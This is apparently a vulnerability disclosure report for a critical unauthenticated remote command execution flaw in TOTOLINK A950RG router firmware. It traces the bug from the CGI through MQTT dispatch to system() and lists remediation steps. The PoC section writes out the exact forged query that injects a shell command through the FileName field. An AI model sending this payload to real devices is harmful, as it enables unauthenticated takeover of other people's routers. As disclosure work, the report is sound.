# Report 01 — Unauthenticated Remote Command Execution via Upload-Query Alias

| Field | Details |
|-------|---------|
| Vendor | TOTOLINK (Zioncom) |
| Product | A950RG |
| Firmware | V4.1.2cu.5268_B20221104 |
| SHA-256 | `fcf25f006f30575abb7356f0dd4325c4c952bd77f76b98166fbeb0de6c3d2c4f` |
| Binary | `/web_cste/cgi-bin/cstecgi.cgi` + `/lib/cste_modules/upgrade.so` (MIPS32 LE) |
| CWE | CWE-862 (Missing Authorization) + CWE-78 (OS Command Injection) |
| Auth required | None |
| CVSS 3.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — **9.8 CRITICAL** |
| Firmware download | https://www.totolink.tw/support_view/A950RG |

---

## Summary

A single unauthenticated HTTP request achieves remote command execution on TOTOLINK A950RG V4.1.2cu.5268_B20221104. The `action=upload` query path in `cstecgi.cgi` runs before the normal session check and accepts topics containing `UploadCustomModule` by substring match. An attacker crafts the query to forge a topic ending at `setUpgradeFW` while injecting shell metacharacters into the `FileName` field. The full path — HTTP → CGI → MQTT broker → `cste_sub` dispatch → `upgrade.so:setUpgradeFW` → shell command — was reproduced in a single isolated QEMU run with no cookie or token.

---

## Root Cause

```
cstecgi.cgi:Main at Ghidra 0x00401868:
  → action=upload branch runs BEFORE normal session/token check
  → inserts query text into JSON with unescaped %s format
  → no-token exception: substring match for "UploadCustomModule"
  → attacker query: UploadCustomModule/setUpgradeFW","FileName":";PAYLOAD;"
  → generated JSON topic: setting/UploadCustomModule/setUpgradeFW
  → FileName field: attacker-controlled shell command

cste_sub:get_action at 0x00402c28:
  → extracts final topic component → "setUpgradeFW"
  → mqtt_process_publish_msg at 0x00402cc4 → dispatches to registered handler

upgrade.so:setUpgradeFW at Ghidra 0x0001468c:
  → short-input cleanup branch (ContentLength < 1000)
  → formats: rm -f %s 1>/dev/null 2>&1   at 0x00015064
  → CsteSystem(cmd)   at 0x0001507c → system()
  → FileName NOT sanitized ❌
```

---

## PoC

### Reproduction steps and results

**Step 1 — Negative control (no-token, no alias):**
- Send `action=upload&setUpgradeFW&dummy&flag=0` without cookie
- **Result:** HTTP 200, `token invalid`. Auth gate works for ordinary requests.

**Step 2 — Forged request (no cookie, no token):**
- Send multipart request with query: `action=upload&UploadCustomModule/setUpgradeFW","FileName":";echo${IFS}CHAIN_MARKER>/tmp/a950rg-query-topic-marker;"&flag=0`
- No Cookie header, no session token
- **Result:**
  - CGI published topic `totolink/router/setting/UploadCustomModule/setUpgradeFW` to MQTT broker
  - `cste_sub` dispatched to `upgrade.so:setUpgradeFW`
  - Handler processed injected FileName → formatted shell command → called CsteSystem
  - Handler returned `upgradeERR: MM_FwFileInvalid` (expected — no real firmware uploaded)

**Step 3 — Verify command execution:**
- Check guest `/tmp/a950rg-query-topic-marker`
- **Result:** File exists, content = `CHAIN_MARKER` (13 bytes). Shell command executed successfully.

**Step 4 — Verify process trace:**
- Check `lab-cste_sub.log` in runtime directory
- **Result:** Shell child execution recorded, successful child exit. Target shell ran the injected echo command.

**Full reproduction:** `python3 analysis/a950rg/poc/probe_query_topic_auth_bypass_qemu.py setUpgradeFW FileName ';echo${IFS}CHAIN_MARKER>/tmp/a950rg-query-topic-marker;'`

**Artifacts:** `.tools/firmware/a950rg/runtime-query-topic-20261004-211821/` — `lab-mqtt-broker.log` (request + reply), `a950rg-query-topic-marker` (marker), `lab-cste_sub.log` (shell trace)

### Negative controls

| # | Test | Cookie | Query | Result | Pass |
|---|------|--------|-------|--------|------|
| 1 | No alias substring | None | `action=upload&setUpgradeFW&dummy&flag=0` | `token invalid` | ✅ Rejected |
| 2 | **Forged alias** | **None** | **`UploadCustomModule/setUpgradeFW","FileName":";PAYLOAD;"`** | **Marker created** | ⚠️ **RCE** |

---

## Impact

A single unauthenticated HTTP request from the management LAN achieves command execution as the firmware service process. The PoC creates only a harmless marker. On a deployed device, this enables full device compromise, credential theft, persistent backdoor, and lateral network movement — all without any credentials.

---

## Validation

| Item | Status |
|------|--------|
| Environment | QEMU-user MIPS32 LE, private namespaces, loopback Lighttpd + MQTT |
| End-to-end | ✅ Single run: HTTP → CGI → MQTT → handler → shell marker |
| Binaries tested | Exact vendor CGI, cste_sub, upgrade.so, Lighttpd (unmodified) |
| Shims | AP-MIB startup thunks only; CGI/handler/shell path unmodified |
| Physical device | NOT tested |

---

## Remediation

1. Sanitize query-string input before inserting into JSON topic format
2. Remove substring-only UploadCustomModule exception — use exact topic match
3. Shell-escape all user-supplied values before CsteSystem()/system()
4. Apply session check to the action=upload branch
